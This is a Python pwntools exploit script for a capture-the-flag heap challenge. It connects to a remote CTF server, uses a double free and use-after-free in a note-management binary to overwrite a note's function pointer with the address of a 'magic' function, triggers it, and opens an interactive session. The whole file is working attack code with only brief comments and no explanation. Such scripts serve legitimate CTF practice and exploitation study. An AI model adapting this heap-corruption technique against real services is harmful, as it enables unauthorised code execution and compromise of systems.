import sys
import time
from pwn import *

p = remote('ctf.j0n9hyun.xyz',3020)

class MENU:
        add_note = '1'
        del_note = '2'
        print_note = '3'

def add_note(size, content):
        p.recv()
        p.sendline(MENU.add_note)
        p.recv()
        p.sendline(size)
        p.recv()
        p.sendline(content)

def del_note(idx):
        p.recv()
        p.sendline(MENU.del_note)
        p.recv()
        p.sendline(idx)
        p.recv()

def print_note(idx):
        p.recv()
        p.sendline(MENU.print_note)
        print(p.recvuntil(':'))
        p.sendline(idx)

e = ELF('./uaf')
magic = e.sym['magic']

add_note(size='8', content='aaaa')
add_note(size='8', content='bbbb')
del_note(idx='0')
del_note(idx='1')
log.info('double free')
del_note(idx='0')       # double free
add_note(size='100', content='a'*100)   # next malloc will give us notelist[0].content
add_note(size='8', content=p32(magic))
print_note(idx='1')     # use overwrited func
print(p.recv())

p.interactive()
